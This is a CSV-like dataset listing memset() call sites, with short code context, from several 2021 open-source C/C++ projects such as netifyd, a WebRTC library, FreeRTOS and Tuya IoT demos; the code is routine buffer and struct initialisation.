2021\netifyd\src\nd-capture.cpp,Dataset Download,../../Dataset Download/2021\netifyd\src\nd-capture.cpp,"memset(&stats, 0, sizeof(struct pcap_stat));",120,1,"int ndCaptureThread::GetCaptureStats(struct pcap_stat &stats)
{
    memset(&stats, 0, sizeof(struct pcap_stat));

    if (pcap_file.size() || pcap == NULL) return 1;
"
2021\netifyd\src\nd-conntrack.cpp,Dataset Download,../../Dataset Download/2021\netifyd\src\nd-conntrack.cpp,"memset(dst, 0, sizeof(struct sockaddr_storage));",120,1,"    struct sockaddr_in6 *sa6 = reinterpret_cast<struct sockaddr_in6 *>(dst);

    memset(dst, 0, sizeof(struct sockaddr_storage));
    dst->ss_family = af;

"
2021\netifyd\src\nd-detection.cpp,Dataset Download,../../Dataset Download/2021\netifyd\src\nd-detection.cpp,"memset(entry->flow->ndpi_flow, 0, sizeof(ndpi_flow_struct));",120,1,"            throw ndDetectionThreadException(strerror(ENOMEM));

        memset(entry->flow->ndpi_flow, 0, sizeof(ndpi_flow_struct));

        entry->flow->id_src = new ndpi_id_struct;
"
2021\netifyd\src\nd-detection.cpp,Dataset Download,../../Dataset Download/2021\netifyd\src\nd-detection.cpp,"memset(entry->flow->id_src, 0, sizeof(ndpi_id_struct));",120,1,"            throw ndDetectionThreadException(strerror(ENOMEM));

        memset(entry->flow->id_src, 0, sizeof(ndpi_id_struct));
        memset(entry->flow->id_dst, 0, sizeof(ndpi_id_struct));

"
2021\netifyd\src\nd-detection.cpp,Dataset Download,../../Dataset Download/2021\netifyd\src\nd-detection.cpp,"memset(entry->flow->id_dst, 0, sizeof(ndpi_id_struct));",120,1,"
        memset(entry->flow->id_src, 0, sizeof(ndpi_id_struct));
        memset(entry->flow->id_dst, 0, sizeof(ndpi_id_struct));

        id_src = entry->flow->id_src;
"
2021\netifyd\src\nd-flow.cpp,Dataset Download,../../Dataset Download/2021\netifyd\src\nd-flow.cpp,"memset(digest_mdata, 0, SHA1_DIGEST_LENGTH);",120,1,"
    memcpy(digest_lower, flow.digest_lower, SHA1_DIGEST_LENGTH);
    memset(digest_mdata, 0, SHA1_DIGEST_LENGTH);

    lower_addr4 = (struct sockaddr_in *)&lower_addr;
"
2021\netifyd\src\nd-inotify.cpp,Dataset Download,../../Dataset Download/2021\netifyd\src\nd-inotify.cpp,"memset(watch, 0, sizeof(struct nd_inotify_watch));",120,1,"            throw ndInotifyException(strerror(ENOMEM));

        memset(watch, 0, sizeof(struct nd_inotify_watch));
        watch->wd = -1;
        watch->filename = filename.c_str();
"
2021\netifyd\src\nd-netlink.cpp,Dataset Download,../../Dataset Download/2021\netifyd\src\nd-netlink.cpp,"memset(buffer, 0, ND_NETLINK_BUFSIZ);",120,1,"    int rc;

    memset(buffer, 0, ND_NETLINK_BUFSIZ);

    memset(&sa, 0, sizeof(struct sockaddr_nl));
"
2021\netifyd\src\nd-netlink.cpp,Dataset Download,../../Dataset Download/2021\netifyd\src\nd-netlink.cpp,"memset(&sa, 0, sizeof(struct sockaddr_nl));",120,1,"    memset(buffer, 0, ND_NETLINK_BUFSIZ);

    memset(&sa, 0, sizeof(struct sockaddr_nl));
    sa.nl_family = AF_NETLINK;
    sa.nl_pid = getpid();
"
2021\netifyd\src\nd-netlink.cpp,Dataset Download,../../Dataset Download/2021\netifyd\src\nd-netlink.cpp,"memset(&addr.network, 0, sizeof(struct sockaddr_storage));",120,1,"    iface.clear();

    memset(&addr.network, 0, sizeof(struct sockaddr_storage));
    addr.length = 0;
    addr.network.ss_family = AF_UNSPEC;
"
2021\netifyd\src\nd-netlink.cpp,Dataset Download,../../Dataset Download/2021\netifyd\src\nd-netlink.cpp,"memset(&addr, 0, sizeof(struct sockaddr_storage));",120,1,"    struct sockaddr_storage addr_bcast;

    memset(&addr, 0, sizeof(struct sockaddr_storage));
    addr.ss_family = AF_UNSPEC;

"
2021\netifyd\src\nd-socket.cpp,Dataset Download,../../Dataset Download/2021\netifyd\src\nd-socket.cpp,"memset(sa_un, 0, base->sa_size);",120,1,"    base->sa = (struct sockaddr_storage *)sa_un;

    memset(sa_un, 0, base->sa_size);

    sa_un->sun_family = base->family = AF_LOCAL;
"
2021\netifyd\src\nd-socket.cpp,Dataset Download,../../Dataset Download/2021\netifyd\src\nd-socket.cpp,"memset(&hints, 0, sizeof(struct addrinfo));",120,1,"        struct addrinfo *result, *rp;

        memset(&hints, 0, sizeof(struct addrinfo));
        hints.ai_family = AF_INET6;
        //hints.ai_family = AF_UNSPEC;
"
2021\netifyd\src\nd-util.cpp,Dataset Download,../../Dataset Download/2021\netifyd\src\nd-util.cpp,"memset(ifr, '\0', sizeof(struct ifreq));",120,1,"    }

    memset(ifr, '\0', sizeof(struct ifreq));
    strncpy(ifr->ifr_name, name.c_str(), IFNAMSIZ - 1);

"
2021\netifyd\src\nd-util.cpp,Dataset Download,../../Dataset Download/2021\netifyd\src\nd-util.cpp,"memset(addr, 0, sizeof(struct ndInterfaceAddress));",120,1,"        struct ndInterfaceAddress *addr = new struct ndInterfaceAddress;
        if (addr == NULL) throw runtime_error(strerror(ENOMEM));
        memset(addr, 0, sizeof(struct ndInterfaceAddress));

        addr->family = ifa->ifa_addr->sa_family;
"
2021\netifyd\src\nd-util.cpp,Dataset Download,../../Dataset Download/2021\netifyd\src\nd-util.cpp,"memset(addr->mac, 0, ETH_ALEN);",120,1,"        switch (addr->family) {
        case AF_LINK:
            memset(addr->mac, 0, ETH_ALEN);
#if defined(__linux__)
            {
"
2021\netifyd\src\netifyd.cpp,Dataset Download,../../Dataset Download/2021\netifyd\src\netifyd.cpp,"memset(nd_config.digest_sink_config, 0, SHA1_DIGEST_LENGTH);",120,1,"    nd_config.ca_socket = -1;

    memset(nd_config.digest_sink_config, 0, SHA1_DIGEST_LENGTH);

    nd_config.fhc_save = ndFHC_PERSISTENT;
"
2021\netifyd\src\netifyd.cpp,Dataset Download,../../Dataset Download/2021\netifyd\src\netifyd.cpp,"memset(mac, 0, ETH_ALEN);",120,1,"
            if (! nd_ifaddrs_get_mac(nd_interface_addrs, (*i).second, mac))
                memset(mac, 0, ETH_ALEN);

            capture_threads[(*i).second] = new ndCaptureThread(
"
2021\netifyd\src\netifyd.cpp,Dataset Download,../../Dataset Download/2021\netifyd\src\netifyd.cpp,"memset(&nda_stats, 0, sizeof(nd_agent_stats));",120,1,"    nd_seed_rng();

    memset(&nda_stats, 0, sizeof(nd_agent_stats));
    nda_stats.cpus = sysconf(_SC_NPROCESSORS_ONLN);

"
2021\netifyd\src\netifyd.cpp,Dataset Download,../../Dataset Download/2021\netifyd\src\netifyd.cpp,"memset(&pkt_totals, 0, sizeof(nd_packet_stats));",120,1,"    }

    memset(&pkt_totals, 0, sizeof(nd_packet_stats));

    if (clock_gettime(CLOCK_MONOTONIC_RAW, &nda_stats.ts_epoch) != 0) {
"
2021\netifyd\src\netifyd.cpp,Dataset Download,../../Dataset Download/2021\netifyd\src\netifyd.cpp,"memset(&sigev, 0, sizeof(struct sigevent));",120,1,"#endif

    memset(&sigev, 0, sizeof(struct sigevent));
    sigev.sigev_notify = SIGEV_SIGNAL;
    sigev.sigev_signo = ND_SIG_UPDATE;
"
2021\netifyd\src\ns-parse.c,Dataset Download,../../Dataset Download/2021\netifyd\src\ns-parse.c,"memset(handle, 0x5e, sizeof *handle);",120,1,"	int i;

	memset(handle, 0x5e, sizeof *handle);
	handle->_msg = msg;
	handle->_eom = eom;
"
2021\pear\examples\gstreamer\main.c,Dataset Download,../../Dataset Download/2021\pear\examples\gstreamer\main.c,"memset(rtp_packet, 0, sizeof(rtp_packet));",120,1,"    gst_buffer_map(buffer, &info, GST_MAP_READ);

    memset(rtp_packet, 0, sizeof(rtp_packet));
    memcpy(rtp_packet, info.data, info.size);
    bytes = info.size;
"
2021\pear\src\dtls_transport.c,Dataset Download,../../Dataset Download/2021\pear\src\dtls_transport.c,"memset(&data, 0, 3000);",120,1,"
  char data[3000];
  memset(&data, 0, 3000);
  int read = SSL_read(dtls_transport->ssl, &data, 3000);
  if(read < 0) {
"
2021\pear\src\dtls_transport.c,Dataset Download,../../Dataset Download/2021\pear\src\dtls_transport.c,"memset(&dtls_transport->remote_policy, 0x0, sizeof(dtls_transport->remote_policy));",120,1,"  }

  memset(&dtls_transport->remote_policy, 0x0, sizeof(dtls_transport->remote_policy));
  memset(&dtls_transport->local_policy, 0x0, sizeof(dtls_transport->local_policy));
  unsigned char material[SRTP_MASTER_LENGTH*2];
"
2021\pear\src\dtls_transport.c,Dataset Download,../../Dataset Download/2021\pear\src\dtls_transport.c,"memset(&dtls_transport->local_policy, 0x0, sizeof(dtls_transport->local_policy));",120,1,"
  memset(&dtls_transport->remote_policy, 0x0, sizeof(dtls_transport->remote_policy));
  memset(&dtls_transport->local_policy, 0x0, sizeof(dtls_transport->local_policy));
  unsigned char material[SRTP_MASTER_LENGTH*2];
  unsigned char *local_key, *local_salt, *remote_key, *remote_salt;
"
2021\pear\src\sdp_attribute.c,Dataset Download,../../Dataset Download/2021\pear\src\sdp_attribute.c,"memset(sdp_attribute->answer, 0, sizeof(sdp_attribute->answer));",120,1,"    return sdp_attribute;

  memset(sdp_attribute->answer, 0, sizeof(sdp_attribute->answer));
  memset(sdp_attribute->attributes, 0, sizeof(sdp_attribute->attributes));
  return sdp_attribute;
"
2021\pear\src\sdp_attribute.c,Dataset Download,../../Dataset Download/2021\pear\src\sdp_attribute.c,"memset(sdp_attribute->attributes, 0, sizeof(sdp_attribute->attributes));",120,1,"
  memset(sdp_attribute->answer, 0, sizeof(sdp_attribute->answer));
  memset(sdp_attribute->attributes, 0, sizeof(sdp_attribute->attributes));
  return sdp_attribute;
}
"
2021\Powergy-Medusa-FW-Basic-Auth\lib\ArduinoJson\extras\tests\JsonDocument\shrinkToFit.cpp,Dataset Download,../../Dataset Download/2021\Powergy-Medusa-FW-Basic-Auth\lib\ArduinoJson\extras\tests\JsonDocument\shrinkToFit.cpp,"memset(_ptr, '#', _size);",120,1,"    void* new_ptr = malloc(new_size);
    memcpy(new_ptr, _ptr, std::min(new_size, _size));
    memset(_ptr, '#', _size);  // erase
    free(_ptr);
    _ptr = new_ptr;
"
2021\Powergy-Medusa-FW-Basic-Auth\lib\DallasTemperature\DallasTemperature.cpp,Dataset Download,../../Dataset Download/2021\Powergy-Medusa-FW-Basic-Auth\lib\DallasTemperature\DallasTemperature.cpp,"memset((DallasTemperature*)p,0,size);",120,1,"	void * p;// void pointer
	p = malloc(size);// Allocate memory
	memset((DallasTemperature*)p,0,size);// Initialise memory

	//!!! CANT EXPLICITLY CALL CONSTRUCTOR - workaround by using an init() methodR - workaround by using an init() method
"
2021\Powergy-Medusa-FW-Basic-Auth\lib\WiFiManager\WiFiManager.cpp,Dataset Download,../../Dataset Download/2021\Powergy-Medusa-FW-Basic-Auth\lib\WiFiManager\WiFiManager.cpp,"memset(_value, 0, _length + 1);",120,1,"  _length = length;
  _value  = new char[_length + 1]; 
  memset(_value, 0, _length + 1); // explicit null
  
  if (defaultValue != NULL) {
"
2021\Projekt-IoT-AiR\src\http.cpp,Dataset Download,../../Dataset Download/2021\Projekt-IoT-AiR\src\http.cpp,"memset(content, 0, sizeof(content));",120,1,"    static char content[256];

    memset(content, 0, sizeof(content));

    if (strcmp(req->uri, mqttURI) == 0)
"
2021\Projekt-IoT-AiR\src\mqtt.cpp,Dataset Download,../../Dataset Download/2021\Projekt-IoT-AiR\src\mqtt.cpp,"memset(completedTopic, 0, sizeof(completedTopic));",120,1,"
    // Prepare topic.
    memset(completedTopic, 0, sizeof(completedTopic)); // Zero just in case.
    memcpy(completedTopic, ns, strlen(ns));            // Prepend namespace.
    strcat(completedTopic, ""/"");                       // Append slash.
"
2021\Projekt-IoT-AiR\src\mqtt.cpp,Dataset Download,../../Dataset Download/2021\Projekt-IoT-AiR\src\mqtt.cpp,"memset(dataStr, 0, sizeof(dataStr));",120,1,"
    // Prepare data.
    memset(dataStr, 0, sizeof(dataStr));                 // Zero just in case.
    snprintf(dataStr, sizeof(dataStr), formatter, data); // Replace formatter with given data.

"
2021\secure-iot-analysis-ecoin-platform\collector\collector.c,Dataset Download,../../Dataset Download/2021\secure-iot-analysis-ecoin-platform\collector\collector.c,"memset(&hints,0, sizeof hints);",120,1,"	struct addrinfo hints;
	struct addrinfo *resolution;
	memset(&hints,0, sizeof hints);
	hints.ai_family = AF_INET;
	hints.ai_socktype = SOCK_STREAM;
"
2021\secure-iot-analysis-ecoin-platform\collector\collector.c,Dataset Download,../../Dataset Download/2021\secure-iot-analysis-ecoin-platform\collector\collector.c,"memset(out,0,2*sizeof(unsigned short));",120,1,"	unsigned short *out;
	out = malloc(2*sizeof(unsigned short));
	memset(out,0,2*sizeof(unsigned short));
	out[0] = 0;	
	out[1] = type;
"
2021\secure-iot-analysis-ecoin-platform\collector\collector.c,Dataset Download,../../Dataset Download/2021\secure-iot-analysis-ecoin-platform\collector\collector.c,"memset(coinbuf,0,coinLength);",120,1,"	
	for (int i = amount; i>0;i--){
		memset(coinbuf,0,coinLength);
		if (recv_all(c,&coinbuf,coinLength) == -1){ return -1; }
		writeCoin(coinbuf,coinLength);
"
2021\secure-iot-analysis-ecoin-platform\collector\collector.c,Dataset Download,../../Dataset Download/2021\secure-iot-analysis-ecoin-platform\collector\collector.c,"memset(headbuf,0,PACKET_HEADER_SIZE);",120,1,"		sendHeader(c,BANK_DISPENSE_ACK);
		//int status;
		memset(headbuf,0,PACKET_HEADER_SIZE);
		if (recv_all(c,headbuf,PACKET_HEADER_SIZE) <= 0){
			printf(""Bank communication error\n"");
"
2021\secure-iot-analysis-ecoin-platform\collector\collector.c,Dataset Download,../../Dataset Download/2021\secure-iot-analysis-ecoin-platform\collector\collector.c,"memset(pkt,1,sizeof(packet));",120,1,"	packet *pkt;
	pkt = malloc(sizeof(packet));
	memset(pkt,1,sizeof(packet));
	pkt->packet_type = SERVICE_REQ;
	pkt->length = 0;
"
2021\stm32-rtc-scheduler\lib\FreeRTOS\stream_buffer.c,Dataset Download,../../Dataset Download/2021\stm32-rtc-scheduler\lib\FreeRTOS\stream_buffer.c,"( void ) memset( pxStreamBuffer, 0x00, sizeof( StreamBuffer_t ) );",120,1,"		/* The structure and buffer were not allocated dynamically and cannot be
		freed - just scrub the structure so future use will assert. */
		( void ) memset( pxStreamBuffer, 0x00, sizeof( StreamBuffer_t ) );
	}
}
"
2021\stm32-rtc-scheduler\lib\FreeRTOS\stream_buffer.c,Dataset Download,../../Dataset Download/2021\stm32-rtc-scheduler\lib\FreeRTOS\stream_buffer.c,"configASSERT( memset( pucBuffer, ( int ) xWriteValue, xBufferSizeBytes ) == pucBuffer );",120,1,"		result in confusion as to what is actually being observed. */
		const BaseType_t xWriteValue = 0x55;
		configASSERT( memset( pucBuffer, ( int ) xWriteValue, xBufferSizeBytes ) == pucBuffer );
	} /*lint !e529 !e438 xWriteValue is only used if configASSERT() is defined. */
	#endif
"
2021\stm32-rtc-scheduler\lib\FreeRTOS\stream_buffer.c,Dataset Download,../../Dataset Download/2021\stm32-rtc-scheduler\lib\FreeRTOS\stream_buffer.c,"( void ) memset( ( void * ) pxStreamBuffer, 0x00, sizeof( StreamBuffer_t ) ); */",120,1,"	#endif

	( void ) memset( ( void * ) pxStreamBuffer, 0x00, sizeof( StreamBuffer_t ) ); /*lint !e9087 memset() requires void *. */
	pxStreamBuffer->pucBuffer = pucBuffer;
	pxStreamBuffer->xLength = xBufferSizeBytes;
"
2021\stm32-rtc-scheduler\lib\FreeRTOS\tasks.c,Dataset Download,../../Dataset Download/2021\stm32-rtc-scheduler\lib\FreeRTOS\tasks.c,"( void ) memset( pxNewTCB->pxStack, ( int ) tskSTACK_FILL_BYTE, ( size_t ) ulStackDepth * sizeof( StackType_t ) );",120,1,"	{
		/* Fill the stack with a known value to assist debugging. */
		( void ) memset( pxNewTCB->pxStack, ( int ) tskSTACK_FILL_BYTE, ( size_t ) ulStackDepth * sizeof( StackType_t ) );
	}
	#endif /* tskSET_NEW_STACKS_TO_KNOWN_VALUE */
"
2021\tuya-iotos-embeded-demo-wifi-ble-environment-monitor\src\tuya_device.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-demo-wifi-ble-environment-monitor\src\tuya_device.c,"memset(&key_def, 0, SIZEOF(key_def));",120,1,"
    /* åˆå§‹åŒ– key ç›¸å…³å‚æ•° */
    memset(&key_def, 0, SIZEOF(key_def));
    key_def.port = WIFI_KEY_PIN;    //æŒ‰é”®å¼•è„š
    key_def.long_key_time = WIFI_KEY_LONG_PRESS_MS; //é•¿æŒ‰å¤šä¹…ç®—é•¿æŒ‰
"
2021\tuya-iotos-embeded-demo-wifi-ble-environment-monitor\src\tuya_dp_process.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-demo-wifi-ble-environment-monitor\src\tuya_dp_process.c,"memset(dp_arr, 0, dp_cnt*SIZEOF(TY_OBJ_DP_S));",120,1,"    }

    memset(dp_arr, 0, dp_cnt*SIZEOF(TY_OBJ_DP_S));

    /* é¢„çƒ­çŠ¶æ€ */
"
2021\tuya-iotos-embeded-demo-wifi-ble-environment-monitor\src\tuya_environment_monitor.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-demo-wifi-ble-environment-monitor\src\tuya_environment_monitor.c,"memset(tuya_adc.priv.pData, 0, ADC_DATA_LEN*sizeof(USHORT_T));",120,1,"{
    tuya_adc.priv.pData = Malloc(ADC_DATA_LEN * sizeof(USHORT_T));
    memset(tuya_adc.priv.pData, 0, ADC_DATA_LEN*sizeof(USHORT_T));
    tuya_adc.priv.data_buff_size = ADC_DATA_LEN; //è®¾ç½®æ•°æ®ç¼“å­˜ä¸ªæ•°
}
"
2021\tuya-iotos-embeded-demo-wifi-ble-environment-monitor\src\tuya_environment_monitor.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-demo-wifi-ble-environment-monitor\src\tuya_environment_monitor.c,"memset(pm25_receive_buffer, 0, sizeof(pm25_receive_buffer));",120,1,"    UCHAR_T *p_pm25_value = NULL;

    memset(pm25_receive_buffer, 0, sizeof(pm25_receive_buffer));

    //è¯»å–ä¸²å£æ•°æ®
"
2021\tuya-iotos-embeded-demo-wifi-ble-environment-monitor\src\tuya_environment_monitor.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-demo-wifi-ble-environment-monitor\src\tuya_environment_monitor.c,"memset(ch2o_receive_buffer, 0, sizeof(ch2o_receive_buffer));",120,1,"    UCHAR_T *p_ch2o_value = NULL;

    memset(ch2o_receive_buffer, 0, sizeof(ch2o_receive_buffer));

    //è¯»å–ä¸²å£æ•°æ®
"
2021\tuya-iotos-embeded-demo-wifi-ble-environment-monitor\src\soc\soc_adc.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-demo-wifi-ble-environment-monitor\src\soc\soc_adc.c,"memset(adc_desc.pData, 0, TEMP_ADC_DATA_LEN*sizeof(USHORT_T));",120,1,"    *(USHORT_T*)output = 0xFFFF;
    INT_T value_sum = 0;
    memset(adc_desc.pData, 0, TEMP_ADC_DATA_LEN*sizeof(USHORT_T));

    GLOBAL_INT_DISABLE();
"
2021\tuya-iotos-embeded-demo-wifi-ble-environment-monitor\src\soc\soc_timer.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-demo-wifi-ble-environment-monitor\src\soc\soc_timer.c,"memset(cStr, 0, len);",120,1,"VOID vNum2Str(IN CHAR_T cMode, IN UINT_T uiNum, IN UCHAR_T len, OUT CHAR_T *cStr)
{
    memset(cStr, 0, len);
    
    switch(cMode) {
"
2021\tuya-iotos-embeded-demo-wifi-ble-smart-planter\src\plant_control.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-demo-wifi-ble-smart-planter\src\plant_control.c,"memset(tuya_adc.priv.pData, 0, TEMP_ADC_DATA_LEN*sizeof(USHORT_T));",120,1,"    // adc driver init
    tuya_adc.priv.pData = Malloc(TEMP_ADC_DATA_LEN * sizeof(USHORT_T));
    memset(tuya_adc.priv.pData, 0, TEMP_ADC_DATA_LEN*sizeof(USHORT_T));
    tuya_adc.priv.data_buff_size = TEMP_ADC_DATA_LEN; //è®¾ç½®æ•°æ®ç¼“å­˜ä¸ªæ•°

"
2021\tuya-iotos-embeded-demo-wifi-ble-smart-planter\src\plant_soc\soc_i2c.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-demo-wifi-ble-smart-planter\src\plant_soc\soc_i2c.c,"memset(&g_i2c_gpio, 0, SIZEOF(i2c_pin_t));",120,1,"
    
    memset(&g_i2c_gpio, 0, SIZEOF(i2c_pin_t));
    memcpy(&g_i2c_gpio, i2c_pin, SIZEOF(i2c_pin_t));

"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\apps\tuya_demo_elp_1plug\src\tuya_dp_upload.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\apps\tuya_demo_elp_1plug\src\tuya_dp_upload.c,"memset(upload_dp,0, SIZEOF(DP_UPLOAD_S));",120,1,"        return NULL;
    }
    memset(upload_dp,0, SIZEOF(DP_UPLOAD_S));

    obj_dp = (TY_OBJ_DP_S*)Malloc(dp_num*SIZEOF(TY_OBJ_DP_S));
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\apps\tuya_demo_elp_1plug\src\tuya_dp_upload.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\apps\tuya_demo_elp_1plug\src\tuya_dp_upload.c,"memset(obj_dp, 0, dp_num*SIZEOF(TY_OBJ_DP_S));",120,1,"        return NULL;
    }
    memset(obj_dp, 0, dp_num*SIZEOF(TY_OBJ_DP_S));

    upload_dp->dp_num  = dp_num;
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\apps\tuya_demo_light_pwm\src\common\device_config_load.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\apps\tuya_demo_light_pwm\src\common\device_config_load.c,"memset(&sg_device_cfg, 0, SIZEOF(device_config_t));",120,1,"    sg_oem_config_load_flag = FALSE;

    memset(&sg_device_cfg, 0, SIZEOF(device_config_t));
    
    sg_device_cfg.ctrl_pin = PIN_NOEXIST;
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\apps\tuya_demo_light_pwm\src\common\light_tools.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\apps\tuya_demo_light_pwm\src\common\light_tools.c,"memset(str, 0, len);",120,1,"VOID tuya_num_to_str(IN CHAR_T mode, IN UINT_T num, IN UCHAR_T len, OUT CHAR_T *str)
{
    memset(str, 0, len);
    
    switch (mode) {
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\apps\tuya_demo_light_pwm\src\common\light_tools.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\apps\tuya_demo_light_pwm\src\common\light_tools.c,"memset(tmp_str, 0, 5);",120,1,"
    //unit stand time
    memset(tmp_str, 0, 5);
    strncpy(tmp_str, input_str + offset, 2);
    USHORT_T time2 = (USHORT_T) strtol(tmp_str, NULL, 16);
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\apps\tuya_demo_light_pwm\src\common\light_tools.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\apps\tuya_demo_light_pwm\src\common\light_tools.c,"memset(output_str_tmp, 0, 27);",120,1,"    USHORT_T val_T = (input_buf[7] & 0xFF) | ((input_buf[3] & 0x3) << 8);

    memset(output_str_tmp, 0, 27);
    snprintf(output_str_tmp, 27, ""%02x%02x%02x%04x%04x%04x%04x%04x"", time1, time2, mode, val_H, val_S, val_V, val_L, val_T);
    strncpy(output_str, output_str_tmp, 26);
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\apps\tuya_demo_light_pwm\src\light_app\light_control.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\apps\tuya_demo_light_pwm\src\light_app\light_control.c,"memset(&sg_light_ctrl_data, 0, SIZEOF(light_ctrl_data_t));",120,1,"    tuya_light_shade_ctrl_disable(); //å…³é—­ç¯çš„æ¸å˜æŽ§åˆ¶

    memset(&sg_light_ctrl_data, 0, SIZEOF(light_ctrl_data_t));

    sg_light_ctrl_data.switch_status = TRUE;
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\apps\tuya_demo_light_pwm\src\light_app\light_control.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\apps\tuya_demo_light_pwm\src\light_app\light_control.c,"memset(&sg_light_cfg_data, 0, SIZEOF(light_ctrl_cfg_t));",120,1,"    }

    memset(&sg_light_cfg_data, 0, SIZEOF(light_ctrl_cfg_t));
    memcpy(&sg_light_cfg_data, config_data, SIZEOF(light_ctrl_cfg_t));
    memset(&sg_light_ctrl_handle, 0, SIZEOF(light_ctrl_handle_t));
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\apps\tuya_demo_light_pwm\src\light_app\light_control.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\apps\tuya_demo_light_pwm\src\light_app\light_control.c,"memset(&sg_light_ctrl_handle, 0, SIZEOF(light_ctrl_handle_t));",120,1,"    memset(&sg_light_cfg_data, 0, SIZEOF(light_ctrl_cfg_t));
    memcpy(&sg_light_cfg_data, config_data, SIZEOF(light_ctrl_cfg_t));
    memset(&sg_light_ctrl_handle, 0, SIZEOF(light_ctrl_handle_t));

    memset(&app_data, 0, SIZEOF(light_app_data_flash_t));
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\apps\tuya_demo_light_pwm\src\light_app\light_control.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\apps\tuya_demo_light_pwm\src\light_app\light_control.c,"memset(&app_data, 0, SIZEOF(light_app_data_flash_t));",120,1,"    memset(&sg_light_ctrl_handle, 0, SIZEOF(light_ctrl_handle_t));

    memset(&app_data, 0, SIZEOF(light_app_data_flash_t));

    //read app flash data!
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\apps\tuya_demo_light_pwm\src\light_app\light_control.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\apps\tuya_demo_light_pwm\src\light_app\light_control.c,"memset(&sg_light_ctrl_handle.current_val, 0, SIZEOF(bright_data_t));",120,1,"    }

    memset(&sg_light_ctrl_handle.current_val, 0, SIZEOF(bright_data_t));

    //when CCT shut down, need to turn off CCT
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\apps\tuya_demo_light_pwm\src\light_app\light_control.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\apps\tuya_demo_light_pwm\src\light_app\light_control.c,"memset(result, 0, SIZEOF(bright_data_t));",120,1,"    STATIC LIGHT_MODE_E last_mode = MODE_MAX ;

    memset(result, 0, SIZEOF(bright_data_t));

    switch (mode) {
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\apps\tuya_demo_light_pwm\src\light_app\light_control.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\apps\tuya_demo_light_pwm\src\light_app\light_control.c,"memset(&light_scene_ctrl_parm, 0, SIZEOF(light_scene_ctrl_t));",120,1,"    _light_ctrl_shade_stop();  //stop other shade firstly

    memset(&light_scene_ctrl_parm, 0, SIZEOF(light_scene_ctrl_t));

    sg_light_ctrl_handle.scene_unit = strlen(sg_light_ctrl_data.scene + 2) / SCENE_UNIT_LENGTH;
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\apps\tuya_demo_light_pwm\src\light_app\light_control.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\apps\tuya_demo_light_pwm\src\light_app\light_control.c,"memset(&sg_light_ctrl_handle.target_val, 0, sizeof(bright_data_t));",120,1,"        tuya_light_shade_ctrl_disable();      

        memset(&sg_light_ctrl_handle.target_val, 0, sizeof(bright_data_t));  //set target contol data!!!

        if (BRIGHT_MODE_CCT == sg_light_cfg_data.bright_mode) {  
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\apps\tuya_demo_light_pwm\src\light_app\light_control.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\apps\tuya_demo_light_pwm\src\light_app\light_control.c,"memset(&sg_light_ctrl_handle.current_val, 0, sizeof(sg_light_ctrl_handle.current_val));",120,1,"                                                sg_light_ctrl_handle.target_val.white, sg_light_ctrl_handle.target_val.warm);

                    memset(&sg_light_ctrl_handle.current_val, 0, sizeof(sg_light_ctrl_handle.current_val));

                    if (ret != LIGHT_OK) {
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\apps\tuya_demo_light_pwm\src\light_app\light_control.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\apps\tuya_demo_light_pwm\src\light_app\light_control.c,"memset(&music_ctrl_data, 0, sizeof(light_ctrl_data_t));",120,1,"
            light_ctrl_data_t music_ctrl_data;
            memset(&music_ctrl_data, 0, sizeof(light_ctrl_data_t));
            memcpy(&music_ctrl_data, &sg_light_ctrl_data, SIZEOF(light_ctrl_data_t));     //make sure music mode restart as red color

"
